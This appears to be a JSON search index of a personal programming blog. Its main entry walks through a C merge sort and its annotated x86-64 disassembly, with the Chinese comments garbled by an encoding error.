{"/about/":{"data":{"":" The pain you feel when you write is actually the pain of clarifying your thinking.(David Perell)"},"title":"About"},"/blog/2022-plan/":{"data":{"":" https://www.bilibili.com/video/BV1Cx411S7HJ?p=2 https://see.stanford.edu/Course/CS107 ComputerSystem:A programer perspective Edtion3 English rust-lang kubernetes "},"title":"2022-plan"},"/blog/about/":{"data":{"":" The pain you feel when you write is actually the pain of clarifying your thinking.(David Perell)"},"title":"About"},"/blog/acknowledgement-timeout-retry-sequence-number/":{"data":{"":"","#":"TCP è¦è§£å†³çš„é—®é¢˜ ","references#references":" tcp-congestion-control tcp-congestion-control-ppt "},"title":"acknowledgement-timeout-retry-sequence-number"},"/blog/algorithm-merge-sort/":{"data":{"":"","merge-sort#merge sort":"","reference#reference":"merge sort merge sort C code #include \u003cstdio.h\u003e\rvoid merge(int* array, int start, int mid, int end){\r// start = 0\r// mid = 3\r// end = 7\rint tempArrayLength = end - start + 1; // 8\rint tempArray[tempArrayLength]; // tempArray[8]\rint p1 = start; // 0\rint p2 = mid + 1; // 4\rint p = 0;\r// æ¯”è¾ƒä¸¤ä¸ªå°é›†åˆï¼Œä¾æ¬¡æ”¾å…¥å¤§é›†åˆ, ç¬¬ä¸€ä¸ª while å¾ªç¯\rwhile (p1 \u003c= mid \u0026\u0026 p2 \u003c= end){ p1 \u003c=3 \u0026\u0026 p2 \u003c=7\rif(array[p1] \u003c= array[p2]){ // 7 \u003c= 5 XXX\rtempArray[p++] = array[p1++];\r} else {\rtempArray[p++] = array[p2++]; // tempArray[0] = 5\r}\r}\r// å·¦ä¾§é›†åˆè¿˜æœ‰å‰©ä½™ï¼Œä¾æ¬¡æ”¾å…¥å¤§é›†åˆï¼Œ ç¬¬äºŒä¸ª while å¾ªç¯\rwhile (p1 \u003c= mid){ // 2 \u003c= 2 tempArray[p++] = array[p1++]; tempArray[1] = 7\r}\r// å³ä¾§é›†åˆè¿˜æœ‰å‰©ä½™ï¼Œä¾æ¬¡æ”¾å…¥å¤§é›†åˆï¼Œç¬¬ä¸‰ä¸ª while å¾ªç¯\rwhile (p2 \u003c= end){ // 4 \u003c= 3 XXX\rtempArray[p++] = array[p2++]; // tempArray[1] = 9\r}\r// å¤§é›†åˆå¤åˆ¶åˆ°åŸæ¥çš„æ•°ç»„ï¼Œfor å¾ªç¯\rfor (int i = 0; i \u003c tempArrayLength; i++) {\rarray[i + start] = tempArray[i]; // 3,9,5,7\r}\r}\rvoid mergeSort(int* array, int start, int end){\rif(start \u003c end){\rint mid = (start + end) / 2;\rmergeSort(array, start, mid); // mergeSort_L(array, start, mid);\rmergeSort(array, mid+1, end); // mergeSort_R(array, mid+1, end);\rmerge(array, start, mid, end);\r}\r}\rint main(){\rint array[8] = {9, 3, 7, 5, 8, 6, 4, 10};\rmergeSort(array, 0 , 7);\rfor (int i = 0; i \u003c 8; i++)\r{\rprintf(\"%d#\",array[i]);\r}\r} x64 æ±‡ç¼–ä»£ç åˆ†æ mergesort: file format elf64-x86-64 ; 64bits æ±‡ç¼–ä»£ç  Disassembly of section .init: 0000000000000548 \u003c_init\u003e: 548:\t48 83 ec 08 sub $0x8,%rsp 54c:\t48 8b 05 95 0a 20 00 mov 0x200a95(%rip),%rax # 200fe8 \u003c__gmon_start__\u003e 553:\t48 85 c0 test %rax,%rax 556:\t74 02 je 55a \u003c_init+0x12\u003e 558:\tff d0 callq *%rax 55a:\t48 83 c4 08 add $0x8,%rsp 55e:\tc3 retq Disassembly of section .plt: 0000000000000560 \u003c.plt\u003e: 560:\tff 35 52 0a 20 00 pushq 0x200a52(%rip) # 200fb8 \u003c_GLOBAL_OFFSET_TABLE_+0x8\u003e 566:\tff 25 54 0a 20 00 jmpq *0x200a54(%rip) # 200fc0 \u003c_GLOBAL_OFFSET_TABLE_+0x10\u003e 56c:\t0f 1f 40 00 nopl 0x0(%rax) 0000000000000570 \u003c__stack_chk_fail@plt\u003e: 570:\tff 25 52 0a 20 00 jmpq *0x200a52(%rip) # 200fc8 \u003c__stack_chk_fail@GLIBC_2.4\u003e 576:\t68 00 00 00 00 pushq $0x0 57b:\te9 e0 ff ff ff jmpq 560 \u003c.plt\u003e 0000000000000580 \u003cprintf@plt\u003e: 580:\tff 25 4a 0a 20 00 jmpq *0x200a4a(%rip) # 200fd0 \u003cprintf@GLIBC_2.2.5\u003e 586:\t68 01 00 00 00 pushq $0x1 58b:\te9 d0 ff ff ff jmpq 560 \u003c.plt\u003e Disassembly of section .plt.got: 0000000000000590 \u003c__cxa_finalize@plt\u003e: 590:\tff 25 62 0a 20 00 jmpq *0x200a62(%rip) # 200ff8 \u003c__cxa_finalize@GLIBC_2.2.5\u003e 596:\t66 90 xchg %ax,%ax Disassembly of section .text: ; ä»£ç åŒº 00000000000005a0 \u003c_start\u003e: 5a0:\t31 ed xor %ebp,%ebp ; ebp = 0 5a2:\t49 89 d1 mov %rdx,%r9 5a5:\t5e pop %rsi 5a6:\t48 89 e2 mov %rsp,%rdx 5a9:\t48 83 e4 f0 and $0xfffffffffffffff0,%rsp 5ad:\t50 push %rax 5ae:\t54 push %rsp 5af:\t4c 8d 05 aa 04 00 00 lea 0x4aa(%rip),%r8 # a60 \u003c__libc_csu_fini\u003e 5b6:\t48 8d 0d 33 04 00 00 lea 0x433(%rip),%rcx # 9f0 \u003c__libc_csu_init\u003e 5bd:\t48 8d 3d 79 03 00 00 lea 0x379(%rip),%rdi # 93d \u003cmain\u003e 5c4:\tff 15 16 0a 20 00 callq *0x200a16(%rip) # 200fe0 \u003c__libc_start_main@GLIBC_2.2.5\u003e 5ca:\tf4 hlt 5cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 00000000000005d0 \u003cderegister_tm_clones\u003e: 5d0:\t48 8d 3d 39 0a 20 00 lea 0x200a39(%rip),%rdi # 201010 \u003c__TMC_END__\u003e 5d7:\t55 push %rbp 5d8:\t48 8d 05 31 0a 20 00 lea 0x200a31(%rip),%rax # 201010 \u003c__TMC_END__\u003e 5df:\t48 39 f8 cmp %rdi,%rax 5e2:\t48 89 e5 mov %rsp,%rbp 5e5:\t74 19 je 600 \u003cderegister_tm_clones+0x30\u003e 5e7:\t48 8b 05 ea 09 20 00 mov 0x2009ea(%rip),%rax # 200fd8 \u003c_ITM_deregisterTMCloneTable\u003e 5ee:\t48 85 c0 test %rax,%rax 5f1:\t74 0d je 600 \u003cderegister_tm_clones+0x30\u003e 5f3:\t5d pop %rbp 5f4:\tff e0 jmpq *%rax 5f6:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 5fd:\t00 00 00 600:\t5d pop %rbp 601:\tc3 retq 602:\t0f 1f 40 00 nopl 0x0(%rax) 606:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 60d:\t00 00 00 0000000000000610 \u003cregister_tm_clones\u003e: 610:\t48 8d 3d f9 09 20 00 lea 0x2009f9(%rip),%rdi # 201010 \u003c__TMC_END__\u003e 617:\t48 8d 35 f2 09 20 00 lea 0x2009f2(%rip),%rsi # 201010 \u003c__TMC_END__\u003e 61e:\t55 push %rbp 61f:\t48 29 fe sub %rdi,%rsi 622:\t48 89 e5 mov %rsp,%rbp 625:\t48 c1 fe 03 sar $0x3,%rsi 629:\t48 89 f0 mov %rsi,%rax 62c:\t48 c1 e8 3f shr $0x3f,%rax 630:\t48 01 c6 add %rax,%rsi 633:\t48 d1 fe sar %rsi 636:\t74 18 je 650 \u003cregister_tm_clones+0x40\u003e 638:\t48 8b 05 b1 09 20 00 mov 0x2009b1(%rip),%rax # 200ff0 \u003c_ITM_registerTMCloneTable\u003e 63f:\t48 85 c0 test %rax,%rax 642:\t74 0c je 650 \u003cregister_tm_clones+0x40\u003e 644:\t5d pop %rbp 645:\tff e0 jmpq *%rax 647:\t66 0f 1f 84 00 00 00 nopw 0x0(%rax,%rax,1) 64e:\t00 00 650:\t5d pop %rbp 651:\tc3 retq 652:\t0f 1f 40 00 nopl 0x0(%rax) 656:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 65d:\t00 00 00 0000000000000660 \u003c__do_global_dtors_aux\u003e: 660:\t80 3d a9 09 20 00 00 cmpb $0x0,0x2009a9(%rip) # 201010 \u003c__TMC_END__\u003e 667:\t75 2f jne 698 \u003c__do_global_dtors_aux+0x38\u003e 669:\t48 83 3d 87 09 20 00 cmpq $0x0,0x200987(%rip) # 200ff8 \u003c__cxa_finalize@GLIBC_2.2.5\u003e 670:\t00 671:\t55 push %rbp 672:\t48 89 e5 mov %rsp,%rbp 675:\t74 0c je 683 \u003c__do_global_dtors_aux+0x23\u003e 677:\t48 8b 3d 8a 09 20 00 mov 0x20098a(%rip),%rdi # 201008 \u003c__dso_handle\u003e 67e:\te8 0d ff ff ff callq 590 \u003c__cxa_finalize@plt\u003e 683:\te8 48 ff ff ff callq 5d0 \u003cderegister_tm_clones\u003e 688:\tc6 05 81 09 20 00 01 movb $0x1,0x200981(%rip) # 201010 \u003c__TMC_END__\u003e 68f:\t5d pop %rbp 690:\tc3 retq 691:\t0f 1f 80 00 00 00 00 nopl 0x0(%rax) 698:\tf3 c3 repz retq 69a:\t66 0f 1f 44 00 00 nopw 0x0(%rax,%rax,1) 00000000000006a0 \u003cframe_dummy\u003e: 6a0:\t55 push %rbp 6a1:\t48 89 e5 mov %rsp,%rbp 6a4:\t5d pop %rbp 6a5:\te9 66 ff ff ff jmpq 610 \u003cregister_tm_clones\u003e 00000000000006aa \u003cmerge\u003e: 6aa:\t55 push %rbp 6ab:\t48 89 e5 mov %rsp,%rbp ; rbp = rsp 6ae:\t48 83 ec 50 sub $0x50,%rsp ; rsp = rsp - 0x50 å¼€è¾Ÿæ ˆå¸§ 6b2:\t48 89 7d c8 mov %rdi,-0x38(%rbp) ; ç¬¬ä¸€ä¸ªå‚æ•° \u0026array[0] 6b6:\t89 75 c4 mov %esi,-0x3c(%rbp) ; ç¬¬äºŒä¸ªå‚æ•° start 6b9:\t89 55 c0 mov %edx,-0x40(%rbp) ; ç¬¬ä¸‰ä¸ªå‚æ•° mid 6bc:\t89 4d bc mov %ecx,-0x44(%rbp) ; ç¬¬å››ä¸ªå‚æ•° end 6bf:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax ; å“¨å…µå€¼åˆ¤å®šæ ˆå¸§æ˜¯å¦å‡ºäº†é—®é¢˜ã€‚ 6c6:\t00 00 6c8:\t48 89 45 f8 mov %rax,-0x8(%rbp) ; å“¨å…µå€¼ 6cc:\t31 c0 xor %eax,%eax ; eax = 0 6ce:\t48 89 e0 mov %rsp,%rax ; rax = rsp 6d1:\t48 89 c6 mov %rax,%rsi ; rsi = rax = rsp è®°å½•è¿™ä¸ª rsp çš„å€¼ 6d4:\t8b 45 bc mov -0x44(%rbp),%eax ; eax = end 6d7:\t2b 45 c4 sub -0x3c(%rbp),%eax ; eax = end - start 6da:\t83 c0 01 add $0x1,%eax ; tempArrayLength = eax = (end - start) + 1 6dd:\t89 45 e4 mov %eax,-0x1c(%rbp) ; tempArrayLength = (end - start) + 1 å¤åˆ¶åˆ° rbp - 0x1c å†…å­˜å¤„ 6e0:\t8b 45 e4 mov -0x1c(%rbp),%eax ; eax = tempArrayLength 6e3:\t48 63 d0 movslq %eax,%rdx ; rdx = tempArrayLength, cltq 32bit æ‰©å±•ä¸º 64bit 6e6:\t48 83 ea 01 sub $0x1,%rdx ; rdx = (tempArrayLength) - 1 = end - start 6ea:\t48 89 55 e8 mov %rdx,-0x18(%rbp) ; end - start å¤åˆ¶åˆ° rbp - 0x18 å†…å­˜åœ°å€å¤„ 6ee:\t48 63 d0 movslq %eax,%rdx ; rdx = (end - start) + 1 ? tempArrayLength 6f1:\t49 89 d2 mov %rdx,%r10 ; r10 = (end - start) + 1 6f4:\t41 bb 00 00 00 00 mov $0x0,%r11d ; r11d = 0 6fa:\t48 63 d0 movslq %eax,%rdx ; rdx = (end - start) + 1 ? tempArrayLength 6fd:\t49 89 d0 mov %rdx,%r8 ; r8 = (end - start) + 1 ? tempArrayLength 700:\t41 b9 00 00 00 00 mov $0x0,%r9d ; r9d = 0 706:\t48 98 cltq ; ç›¸å½“äº movslq %eax,%rax. 708:\t48 c1 e0 02 shl $0x2,%rax ; rax = ((end - start) + 1) * 4 70c:\t48 8d 50 03 lea 0x3(%rax),%rdx ; rdx = 4 * ((end - start) + 1) + 3 710:\tb8 10 00 00 00 mov $0x10,%eax ; eax = 16 715:\t48 83 e8 01 sub $0x1,%rax ; rax = 16 - 1 = 15 719:\t48 01 d0 add %rdx,%rax ; rax = rax + rdx = 15 + 4 * ((end - start) + 1) + 3 = 4 * (end - start) + 22 71c:\tbf 10 00 00 00 mov $0x10,%edi ; edi = 16 721:\tba 00 00 00 00 mov $0x0,%edx ; edx = 0 726:\t48 f7 f7 div %rdi ; (rdx(high-32bit):rax(low-32bit))/rdi , quotient(å•†) in %rax, remainder(ä½™æ•°) in %rdx 729:\t48 6b c0 10 imul $0x10,%rax,%rax ; rax = rax * 16 72d:\t48 29 c4 sub %rax,%rsp ; rsp = rsp - rax åˆ†é…ç©ºé—´ 730:\t48 89 e0 mov %rsp,%rax ; rax = rsp 733:\t48 83 c0 03 add $0x3,%rax ; rax = rsp + 3 737:\t48 c1 e8 02 shr $0x2,%rax ; rax = (rsp + 3) \u003e\u003e 2 73b:\t48 c1 e0 02 shl $0x2,%rax ; rax = ((rsp + 3) \u003e\u003e 2) \u003c\u003c2 73f:\t48 89 45 f0 mov %rax,-0x10(%rbp) ; 743:\t8b 45 c4 mov -0x3c(%rbp),%eax ; eax = start 746:\t89 45 dc mov %eax,-0x24(%rbp) ; start å¤åˆ¶åˆ° rbp - 0x24(p1) å¤„ 749:\t8b 45 c0 mov -0x40(%rbp),%eax ; eax = mid 74c:\t83 c0 01 add $0x1,%eax ; eax = mid + 1 74f:\t89 45 d8 mov %eax,-0x28(%rbp) ; mid + 1 å¤åˆ¶åˆ° rbp - 0x28(p2) å¤„ 752:\tc7 45 d4 00 00 00 00 movl $0x0,-0x2c(%rbp) ; 0 å¤åˆ¶åˆ° rbp - 0x2c(p) å¤„ 759:\te9 90 00 00 00 jmpq 7ee \u003cmerge+0x144\u003e ; æ— æ¡ä»¶è·³è½¬, 0x144 è¡¨ç¤ºè¦è·³è½¬å‡ºä¹Ÿå°±æ˜¯ 7ee è·ç¦» merge(6aa) ä¹‹é—´çš„æ‰€æœ‰æŒ‡ä»¤å­—èŠ‚æ•°æ˜¯ 0x144ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ ; if(array[p1] \u003c= array[p2]) çš„åˆ¤å®š 75e:\t8b 45 dc mov -0x24(%rbp),%eax ; rax = p1 761:\t48 98 cltq 763:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p1 + 0 76a:\t00 76b:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 76f:\t48 01 d0 add %rdx,%rax ; rax = \u0026array[0] + 4 * p1 = \u0026array[p1] 772:\t8b 10 mov (%rax),%edx ; edx = array[p1] 774:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 777:\t48 98 cltq 779:\t48 8d 0c 85 00 00 00 lea 0x0(,%rax,4),%rcx ; rcx = 4 * rax = 4 * p2 780:\t00 781:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 785:\t48 01 c8 add %rcx,%rax ; rax = \u0026array[0] + 4 * p2 = \u0026array[p2] 788:\t8b 00 mov (%rax),%eax ; eax = array[p2] 78a:\t39 c2 cmp %eax,%edx ; cmp array[p2],array[p1] 78c:\t7f 31 jg 7bf \u003cmerge+0x115\u003e ; array[p1] \u003e array[p2] è·³åˆ° else 78e:\t8b 45 dc mov -0x24(%rbp),%eax ; eax = p1 791:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p1 + 1 794:\t89 55 dc mov %edx,-0x24(%rbp) ; p1 = p1 + 1 797:\t48 98 cltq 799:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p1 7a0:\t00 7a1:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 7a5:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = \u0026array[0] + 4 * p1 = \u0026array[p1] 7a9:\t8b 45 d4 mov -0x2c(%rbp),%eax ; eax = p 7ac:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p + 1 7af:\t89 55 d4 mov %edx,-0x2c(%rbp) ; p = p + 1 7b2:\t8b 09 mov (%rcx),%ecx ; ecx = array[p1] 7b4:\t48 8b 55 f0 mov -0x10(%rbp),%rdx ;rdx = \u0026tempArray[0] 7b8:\t48 98 cltq 7ba:\t89 0c 82 mov %ecx,(%rdx,%rax,4) ; tempArray[p] = array[p1] 7bd:\teb 2f jmp 7ee \u003cmerge+0x144\u003e ; å¼€å¯ä¸‹ä¸€è½®åˆ¤å®š\u003e\u003e\u003e\u003e\u003e\u003e\u003e 7bf:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 $$$ begin else array[p1] \u003e array[p2] 7c2:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p2 + 1 7c5:\t89 55 d8 mov %edx,-0x28(%rbp) ; p2 = p2 + 1 7c8:\t48 98 cltq 7ca:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p2 7d1:\t00 7d2:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 7d6:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = rdx + 1 * rax = \u0026array[0] + 4 * p2 = \u0026array[p2] 7da:\t8b 45 d4 mov -0x2c(%rbp),%eax ; eax = p 7dd:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p + 1 7e0:\t89 55 d4 mov %edx,-0x2c(%rbp) ; p = p + 1 7e3:\t8b 09 mov (%rcx),%ecx ; ecx = array[p2] 7e5:\t48 8b 55 f0 mov -0x10(%rbp),%rdx ; rdx = \u0026tempArray[0] , ä¸´æ—¶æ•°ç»„åœ°å€ 7e9:\t48 98 cltq 7eb:\t89 0c 82 mov %ecx,(%rdx,%rax,4) ; tempArray[p] = array[p2] $$$$$ end else 7ee:\t8b 45 dc mov -0x24(%rbp),%eax ; eax = p1 ä¸‹ä¸€è½®åˆ¤å®š\u003e\u003e\u003e\u003e\u003e\u003e\u003e 7f1:\t3b 45 c0 cmp -0x40(%rbp),%eax ; cmp mid,p1 7f4:\t7f 3d jg 833 \u003cmerge+0x189\u003e ; p1 \u003e mid è·³å‡ºå» 7f6:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 æ­¤æ—¶ p1 \u003c= mid, åˆ¤å®š p2 \u003c= end å—ï¼Ÿ 7f9:\t3b 45 bc cmp -0x44(%rbp),%eax ; cmp end,p2 7fc:\t0f 8e 5c ff ff ff jle 75e \u003cmerge+0xb4\u003e ; æ­¤æ—¶ p1 \u003c= mid,p2 \u003c= endï¼Œè¿›å…¥ ifã€‚ 802:\teb 2f jmp 833 \u003cmerge+0x189\u003e; ä¸æ»¡è¶³ç¬¬ä¸€ä¸ª while å¾ªç¯ï¼Œè¿›å…¥ç¬¬äºŒä¸ª while å¾ªç¯ ; p1 \u003c= mid å¾ªç¯ä½“å¼€å§‹ 804:\t8b 45 dc mov -0x24(%rbp),%eax ; eax = p1 807:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p1 + 1 80a:\t89 55 dc mov %edx,-0x24(%rbp) ; p1 = p1 + 1 #### 80d:\t48 98 cltq ; movslq %eax,%rax 80f:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p1 816:\t00 817:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 81b:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = \u0026array[p1] 81f:\t8b 45 d4 mov -0x2c(%rbp),%eax ; eax = p 822:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p + 1 825:\t89 55 d4 mov %edx,-0x2c(%rbp) ; p = p + 1 828:\t8b 09 mov (%rcx),%ecx ; ecx = array[p1] 82a:\t48 8b 55 f0 mov -0x10(%rbp),%rdx ; rdx = \u0026tempArray[0] 82e:\t48 98 cltq 830:\t89 0c 82 mov %ecx,(%rdx,%rax,4) ; tempArray[p] = array[p1] ; ç¬¬äºŒä¸ª while å¾ªç¯ ä¹Ÿå°±æ˜¯ while(p1 \u003c= mid) 833:\t8b 45 dc mov -0x24(%rbp),%eax ; eax = p1 836:\t3b 45 c0 cmp -0x40(%rbp),%eax ; cmp mid, p1 åˆ¤å®š p1 \u003c= mid å—ï¼Ÿ 839:\t7e c9 jle 804 \u003cmerge+0x15a\u003e ; p1 \u003c= mid ; p1 \u003c= mid å¾ªç¯ä½“ç»“æŸ 83b:\teb 2f jmp 86c \u003cmerge+0x1c2\u003e ; ç¬¬äºŒä¸ª while å¾ªç¯çš„ p1 \u003c= midä¸æ»¡è¶³ï¼Œ çŸ­è·¯ã€‚ç›´æ¥è¿›å…¥ç¬¬ä¸‰ä¸ªwhile(p2 \u003c= end) ; p2 \u003c= end çš„å¾ªç¯ä½“å¼€å§‹ 83d:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 840:\t8d 50 01 lea 0x1(%rax),%edx ; edx = p2 + 1 843:\t89 55 d8 mov %edx,-0x28(%rbp) ; p = p2 + 1 846:\t48 98 cltq 848:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * p2 84f:\t00 850:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 854:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = \u0026array[0] + 4 * p2 = \u0026array[p2] 858:\t8b 45 d4 mov -0x2c(%rbp),%eax ; eax = p 85b:\t8d 50 01 lea 0x1(%rax),%edx ; eax = p + 1 85e:\t89 55 d4 mov %edx,-0x2c(%rbp) ; p = p + 1 861:\t8b 09 mov (%rcx),%ecx ; ecx = array[p2] 863:\t48 8b 55 f0 mov -0x10(%rbp),%rdx ;rdx = \u0026tempArray[0] 867:\t48 98 cltq 869:\t89 0c 82 mov %ecx,(%rdx,%rax,4) ; tempArray[p] = array[p2] ; ç¬¬ä¸‰ä¸ª while å¾ªç¯ 86c:\t8b 45 d8 mov -0x28(%rbp),%eax ; eax = p2 å¼€å§‹åˆ¤å®š p2 \u003c= end å—ï¼Ÿ 86f:\t3b 45 bc cmp -0x44(%rbp),%eax ; cmp end, p2 872:\t7e c9 jle 83d \u003cmerge+0x193\u003e ; æ»¡è¶³ p2 \u003c= endï¼Œç¬¬ä¸‰ä¸ª while å¾ªç¯ ; p2 \u003e end 874:\tc7 45 e0 00 00 00 00 movl $0x0,-0x20(%rbp) ; æ­¤æ—¶ p2 \u003e end äº†ã€‚i = 0 87b:\teb 2d jmp 8aa \u003cmerge+0x200\u003e ; ç›´æ¥è·³åˆ° for å¾ªç¯ ; for(int i = 0; i \u003c tempArrayLength; i++) å¼€å§‹ 87d:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = i 880:\t8b 45 c4 mov -0x3c(%rbp),%eax ; eax = start 883:\t01 d0 add %edx,%eax ; eax = start + i 885:\t48 98 cltq 887:\t48 8d 14 85 00 00 00 lea 0x0(,%rax,4),%rdx ; rdx = 4 * (start + i) 88e:\t00 88f:\t48 8b 45 c8 mov -0x38(%rbp),%rax ; rax = \u0026array[0] 893:\t48 8d 0c 02 lea (%rdx,%rax,1),%rcx ; rcx = array[start + i] 897:\t48 8b 45 f0 mov -0x10(%rbp),%rax ; rax = \u0026tempArray[0] 89b:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = i 89e:\t48 63 d2 movslq %edx,%rdx 8a1:\t8b 04 90 mov (%rax,%rdx,4),%eax ; eax = tempArray[i] 8a4:\t89 01 mov %eax,(%rcx) ; array[start + i] = tempArray[i]; 8a6:\t83 45 e0 01 addl $0x1,-0x20(%rbp) ; i = i + 1 ; åˆ¤å®š i \u003c tempArrayLength å—ï¼Ÿ 8aa:\t8b 45 e0 mov -0x20(%rbp),%eax ; eax = i 8ad:\t3b 45 e4 cmp -0x1c(%rbp),%eax ; cmp tempArrayLength, i 8b0:\t7c cb jl 87d \u003cmerge+0x1d3\u003e ; i \u003c tempArrayLength ; for(int i = 0; i \u003c tempArrayLength; i++) ç»“æŸ ; æ­¤æ—¶ i \u003e= tempArrayLength äº†ã€‚ 8b2:\t48 89 f4 mov %rsi,%rsp ; rsp = rsi(è®°å½•çš„ rsp çš„å€¼) i \u003e= tempArrayLength 8b5:\t90 nop 8b6:\t48 8b 45 f8 mov -0x8(%rbp),%rax ; rax = %fs:0x28 8ba:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax ;The OF and CF flags are cleared; the SF, ZF, and PF flags are set according to the result. The state of the AF flag is undefined. 8c1:\t00 00 8c3:\t74 05 je 8ca \u003cmerge+0x220\u003e ; ZF = 0 è¯´æ˜æ ˆå¸§æ²¡å‡ºé—®é¢˜ï¼Œé€€å‡ºå‡½æ•°ã€‚ 8c5:\te8 a6 fc ff ff callq 570 \u003c__stack_chk_fail@plt\u003e ; èƒ½æ‰§è¡Œåˆ°è¿™è¯´æ˜æ ˆå¸§å‡ºé—®é¢˜äº†ã€‚ã€‚ã€‚ 8ca:\tc9 leaveq 8cb:\tc3 retq 00000000000008cc \u003cmergeSort\u003e: 8cc:\t55 push %rbp 8cd:\t48 89 e5 mov %rsp,%rbp ; rbp = rsp 8d0:\t48 83 ec 20 sub $0x20,%rsp ; rsp = rsp - 0x20 8d4:\t48 89 7d e8 mov %rdi,-0x18(%rbp) ;\u0026array[0] å¤åˆ¶åˆ° rbp - 0x18 åœ°å€å¤„ 8d8:\t89 75 e4 mov %esi,-0x1c(%rbp) ;ç¬¬äºŒä¸ªå‚æ•° (start) å¤åˆ¶åˆ° rbp -0x1c åœ°å€å¤„ 8db:\t89 55 e0 mov %edx,-0x20(%rbp) ;ç¬¬ä¸‰ä¸ªå‚æ•° (end) å¤åˆ¶åˆ° rbp -0x20 åœ°å€å¤„ 8de:\t8b 45 e4 mov -0x1c(%rbp),%eax ;eax = start 8e1:\t3b 45 e0 cmp -0x20(%rbp),%eax ;cmp end,start 8e4:\t7d 54 jge 93a \u003cmergeSort+0x6e\u003e ; start \u003e= endï¼Œç›´æ¥é€€å‡ºå‡½æ•°ã€‚ 8e6:\t8b 55 e4 mov -0x1c(%rbp),%edx ; edx = start æ­¤æ—¶ start \u003c end 8e9:\t8b 45 e0 mov -0x20(%rbp),%eax ; eax = end 8ec:\t01 d0 add %edx,%eax ; eax = start + end 8ee:\t89 c2 mov %eax,%edx ; edx = start + end 8f0:\tc1 ea 1f shr $0x1f,%edx ; edx = edx \u003e\u003e 31 (start + end)/pow(2,31) ç›¸å½“äºæ˜¯ 0 äº†ğŸ˜‚ 8f3:\t01 d0 add %edx,%eax ; eax = (start + end) + 0 8f5:\td1 f8 sar %eax ; eax = (start + end) / 2 ç®—æœ¯å³ç§»ä¸€ä½ï¼Œæœ€é«˜ä½è¡¥ä¸Š eax çš„ç¬¦å·ä½ 8f7:\t89 45 fc mov %eax,-0x4(%rbp) ; mid = (start + end) / 2 å¤åˆ¶åˆ° rbp - 0x4 å†…å­˜åœ°å€å¤„ 8fa:\t8b 55 fc mov -0x4(%rbp),%edx ; edx = mid(start + end) / 2 ä¹Ÿå°±æ˜¯å‡†å¤‡ç¬¬ä¸‰ä¸ªå‚æ•° mid 8fd:\t8b 4d e4 mov -0x1c(%rbp),%ecx ; ecx = start 900:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 904:\t89 ce mov %ecx,%esi ; esi = start ; ç¬¬äºŒä¸ªå‚æ•° 906:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] ; ç¬¬ä¸€ä¸ªå‚æ•° 909:\te8 be ff ff ff callq 8cc \u003cmergeSort\u003e ; è°ƒç”¨ mergeSort å·¦ä¾§ mergeSort 90e:\t8b 45 fc mov -0x4(%rbp),%eax ; eax = mid = (start + end) / 2 911:\t8d 48 01 lea 0x1(%rax),%ecx ; mid = mid + 1 914:\t8b 55 e0 mov -0x20(%rbp),%edx ; edx = end ç¬¬ä¸‰ä¸ªå‚æ•° 917:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 91b:\t89 ce mov %ecx,%esi ; esi = mid ç¬¬äºŒä¸ªå‚æ•° 91d:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] ç¬¬ä¸€ä¸ªå‚æ•° 920:\te8 a7 ff ff ff callq 8cc \u003cmergeSort\u003e ; è°ƒç”¨ mergeSort å³ä¾§ mergeSort 925:\t8b 4d e0 mov -0x20(%rbp),%ecx ; ecx = end ; ç¬¬å››ä¸ªå‚æ•° 928:\t8b 55 fc mov -0x4(%rbp),%edx ; edx = mid = (start + end) / 2 ç¬¬ä¸‰ä¸ªå‚æ•° 92b:\t8b 75 e4 mov -0x1c(%rbp),%esi ; esi = start ; ç¬¬äºŒä¸ªå‚æ•° 92e:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 932:\t48 89 c7 mov %rax,%rdi ; rdi = rax ; ç¬¬ä¸€ä¸ªå‚æ•° 935:\te8 70 fd ff ff callq 6aa \u003cmerge\u003e ; è°ƒç”¨ merge å¼€å§‹ merge 93a:\t90 nop ; ä»æ­¤å¤„é”€æ¯æ ˆå¸§ 93b:\tc9 leaveq // é”€æ¯æ ˆå¸§ï¼Œç›¸å½“äº rsp = rbpï¼Œpop rbp 93c:\tc3 retq 